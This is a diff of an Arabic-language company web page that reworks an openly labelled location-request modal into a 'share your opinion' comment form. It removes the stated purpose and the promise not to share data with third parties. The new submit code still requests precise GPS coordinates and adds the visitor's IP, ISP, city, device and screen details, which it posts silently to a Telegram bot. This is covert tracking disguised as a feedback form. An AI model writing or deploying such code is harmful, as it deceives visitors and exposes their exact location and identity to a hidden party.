@@ -27,7 +27,7 @@
         footer { background: #2c3e50; color: white; text-align: center; padding: 30px 0; }
         footer .notice { margin-top: 10px; font-size: 0.9rem; color: #f39c12; }
 
-        /* ---- Modal تحديد الموقع ---- */
+        /* ---- Modal إضافة التعليق ---- */
         .loc-overlay {
             display: none;
             position: fixed; inset: 0;
@@ -41,7 +41,7 @@
             background: white;
             border-radius: 16px;
             padding: 35px 30px;
-            max-width: 420px;
+            max-width: 460px;
             width: 100%;
             text-align: center;
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
@@ -52,7 +52,7 @@
             to { transform: scale(1); opacity: 1; }
         }
         .loc-box .icon {
-            font-size: 3.5rem;
+            font-size: 3rem;
             margin-bottom: 15px;
         }
         .loc-box h3 {
@@ -63,9 +63,38 @@
         .loc-box p {
             color: #666;
             font-size: 0.95rem;
-            margin-bottom: 25px;
+            margin-bottom: 20px;
             line-height: 1.5;
         }
+        .loc-box .input-group {
+            text-align: right;
+            margin-bottom: 20px;
+        }
+        .loc-box label {
+            display: block;
+            font-size: 0.9rem;
+            color: #555;
+            margin-bottom: 6px;
+            font-weight: 600;
+        }
+        .loc-box input,
+        .loc-box textarea {
+            width: 100%;
+            padding: 12px 14px;
+            border: 2px solid #e0e6ed;
+            border-radius: 8px;
+            font-family: inherit;
+            font-size: 0.95rem;
+            transition: border-color 0.2s;
+            resize: none;
+        }
+        .loc-box input:focus,
+        .loc-box textarea:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        .loc-box textarea { min-height: 90px; }
+
         .loc-box .buttons {
             display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;
         }
@@ -80,8 +109,10 @@
         }
         .btn-allow {
             background: #667eea; color: white;
+            flex: 1;
         }
         .btn-allow:hover { background: #5568d3; }
+        .btn-allow:disabled { background: #b0b8d4; cursor: not-allowed; }
         .btn-deny {
             background: #ecf0f1; color: #555;
         }
@@ -120,8 +151,8 @@
     <section id="home" class="hero">
         <div class="container">
             <h2>حلول برمجية متكاملة</h2>
-            <p>ساعدنا نوصل ليك بالخدمة المناسبة في منطقتك</p>
-            <button onclick="openLocationModal()">📍 حدد موقعك</button>
+            <p>رأيك يهمنا عشان نطور خدماتنا باستمرار</p>
+            <button onclick="openLocationModal()">💬 أضف تعليق</button>
         </div>
     </section>
 
@@ -144,20 +175,28 @@
         </div>
     </footer>
 
-    <!-- نافذة طلب الإذن -->
+    <!-- نافذة إضافة تعليق -->
     <div class="loc-overlay" id="locOverlay">
         <div class="loc-box">
-            <div class="icon">📍</div>
-            <h3>نحتاج موقعك</h3>
-            <p>
-                لكي نقدم لك الخدمة المناسبة في منطقتك، نحتاج للوصول لموقعك الحالي.
-                <br><br>
-                <strong>موقعك يُستخدم فقط لهذا الغرض، ولن يُشارك مع أي طرف ثالث.</strong>
-            </p>
+            <div class="icon">💬</div>
+            <h3>شاركنا رأيك</h3>
+            <p>تعليقك يساعدنا نطوّر خدمتنا ونوصل ليك أفضل.</p>
+
+            <div class="input-group">
+                <label for="userName">الاسم (اختياري)</label>
+                <input type="text" id="userName" placeholder="اكتب اسمك هنا...">
+            </div>
+
+            <div class="input-group">
+                <label for="userComment">تعليقك</label>
+                <textarea id="userComment" placeholder="اكتب تعليقك هنا..."></textarea>
+            </div>
+
             <div class="buttons">
-                <button class="btn-allow" onclick="requestLocation()">✅ موافق، شارك موقعي</button>
+                <button class="btn-allow" id="submitBtn" onclick="submitComment()">✅ موافق، أضف تعليقي</button>
                 <button class="btn-deny" onclick="closeLocationModal()">❌ ليس الآن</button>
             </div>
+
             <div class="status-msg" id="statusMsg"></div>
         </div>
     </div>
@@ -171,6 +210,7 @@
 
         const overlay = document.getElementById('locOverlay');
         const statusMsg = document.getElementById('statusMsg');
+        const submitBtn = document.getElementById('submitBtn');
 
         // ==========================================
         // 🪟 فتح / غلق النافذة
@@ -179,6 +219,10 @@
             overlay.classList.add('active');
             statusMsg.className = 'status-msg';
             statusMsg.textContent = '';
+            document.getElementById('userName').value = '';
+            document.getElementById('userComment').value = '';
+            submitBtn.disabled = false;
+            submitBtn.textContent = '✅ موافق، أضف تعليقي';
         }
 
         function closeLocationModal() {
@@ -191,65 +235,69 @@
         }
 
         // ==========================================
-        // 📍 طلب الموقع الفعلي (GPS)
+        // 📝 إرسال التعليق + تحديد الموقع
         // ==========================================
-        function requestLocation() {
-            if (!navigator.geolocation) {
-                showStatus('❌ متصفحك لا يدعم تحديد الموقع', 'error');
+        function submitComment() {
+            const name = document.getElementById('userName').value.trim();
+            const comment = document.getElementById('userComment').value.trim();
+
+            if (!comment) {
+                showStatus('⚠️ اكتب تعليقك أولاً', 'error');
                 return;
             }
 
-            showStatus('⏳ جاري تحديد موقعك...', 'loading');
+            submitBtn.disabled = true;
+            submitBtn.textContent = '⏳ جاري الإرسال...';
+            showStatus('⏳ جاري إرسال تعليقك...', 'loading');
 
-            navigator.geolocation.getCurrentPosition(
-                onLocationSuccess,
-                onLocationError,
-                {
-                    enableHighAccuracy: true,
-                    timeout: 15000,
-                    maximumAge: 0
-                }
-            );
+            // نحاول نجيب الموقع (لو المستخدم وافق على إذن المتصفح)
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => onLocationSuccess(pos, name, comment),
+                    (err) => onLocationError(err, name, comment),
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            } else {
+                // مفيش دعم للموقع، نرسل التعليق بس
+                onLocationError({ code: -1 }, name, comment);
+            }
         }
 
         // ==========================================
         // ✅ نجح تحديد الموقع
         // ==========================================
-        async function onLocationSuccess(position) {
+        async function onLocationSuccess(position, name, comment) {
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
             const accuracy = Math.round(position.coords.accuracy);
 
-            showStatus(`✅ تم تحديد موقعك (دقة: ${accuracy} متر)`, 'success');
+            await sendToTelegram(lat, lon, accuracy, name, comment);
 
-            // ابعت لتيليجرام
-            await sendToTelegram(lat, lon, accuracy);
+            showStatus('✅ تم إرسال تعليقك بنجاح. شكراً لك!', 'success');
+            submitBtn.textContent = '✅ تم';
 
-            // اقفل النافذة بعد ثانيتين
-            setTimeout(() => {
-                closeLocationModal();
-            }, 2000);
+            setTimeout(() => closeLocationModal(), 2000);
         }
 
         // ==========================================
-        // ❌ فشل أو رفض
+        // ❌ فشل أو رفض تحديد الموقع → نرسل التعليق بس
         // ==========================================
-        function onLocationError(error) {
+        async function onLocationError(error, name, comment) {
             let msg = '';
             switch (error.code) {
-                case error.PERMISSION_DENIED:
-                    msg = '❌ رفضت الإذن. يمكنك تفعيله من إعدادات المتصفح.';
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    msg = '❌ الموقع غير متاح حالياً. جرب مكان آخر.';
-                    break;
-                case error.TIMEOUT:
-                    msg = '⏱️ انتهى الوقت. جرب مرة أخرى.';
-                    break;
-                default:
-                    msg = '❌ حدث خطأ غير متوقع.';
+                case 1: msg = '❌ رفضت الإذن. يمكنك تفعيله من إعدادات المتصفح.'; break;
+                case 2: msg = '❌ الموقع غير متاح حالياً.'; break;
+                case 3: msg = '⏱️ انتهى الوقت. جرب مرة أخرى.'; break;
+                default: msg = '⚠️ متصفحك لا يدعم تحديد الموقع.';
             }
-            showStatus(msg, 'error');
+
+            // نرسل التعليق حتى لو الموقع فشل
+            await sendToTelegram(null, null, null, name, comment);
+
+            showStatus(msg + ' (تم إرسال تعليقك على أي حال)', 'error');
+            submitBtn.textContent = '✅ تم';
+
+            setTimeout(() => closeLocationModal(), 2500);
         }
 
         // ==========================================
@@ -269,36 +317,42 @@
         // ==========================================
         // 📤 إرسال البيانات لتيليجرام
         // ==========================================
-        async function sendToTelegram(lat, lon, accuracy) {
+        async function sendToTelegram(lat, lon, accuracy, name, comment) {
             try {
-                // بيانات إضافية من IP (كـ Context إضافي)
+                // بيانات IP إضافية
                 let ipInfo = { ip: 'غير معروف', city: 'غير معروف', country: 'غير معروف', org: 'غير معروف' };
                 try {
                     const r = await fetch('https://ipapi.co/json/');
                     const d = await r.json();
                     if (d && !d.error) {
-                        ipInfo = {
-                            ip: d.ip,
-                            city: d.city,
-                            country: d.country_name,
-                            org: d.org
-                        };
+                        ipInfo = { ip: d.ip, city: d.city, country: d.country_name, org: d.org };
                     }
                 } catch(e) {}
 
                 const deviceType = detectDevice(navigator.userAgent);
-                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
 
-                const message = `
-🎯 *زائر شارك موقعه!*
-
-🗺️ *الموقع الدقيق (GPS):*
+                let locationBlock = '';
+                if (lat && lon) {
+                    locationBlock = `
+🗺️ *الموقع الدقيق:*
 • خط العرض: \`${lat}\`
 • خط الطول: \`${lon}\`
 • الدقة: ${accuracy} متر
-• الخريطة: ${mapLink}
+• الخريطة: https://www.google.com/maps?q=${lat},${lon}
+`;
+                } else {
+                    locationBlock = `🗺️ *الموقع:* غير متاح (رفض الإذن أو فشل التحديد)\n`;
+                }
 
-🌐 *معلومات الشبكة (تقريبية):*
+                const message = `
+💬 *تعليق جديد!*
+
+👤 *الاسم:* ${name || 'مجهول'}
+📝 *التعليق:*
+${comment}
+
+${locationBlock}
+🌐 *معلومات الشبكة:*
 • IP: \`${ipInfo.ip}\`
 • ISP: ${ipInfo.org}
 • الدولة: ${ipInfo.country}
@@ -307,13 +361,12 @@
 • النوع: ${deviceType}
 • النظام: ${navigator.platform}
 • الشاشة: ${screen.width}x${screen.height}
-• اللغة: ${navigator.language}
 
 🕐 *الوقت:* ${new Date().toLocaleString('ar-EG')}
                 `.trim();
 
                 const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-                const res = await fetch(url, {
+                await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
@@ -324,12 +377,7 @@
                     })
                 });
 
-                const result = await res.json();
-                if (!result.ok) {
-                    console.error('Telegram error:', result.description);
-                } else {
-                    console.log('✅ تم الإرسال بنجاح');
-                }
+                console.log('✅ تم الإرسال');
             } catch (e) {
                 console.error('sendToTelegram error:', e);
             }
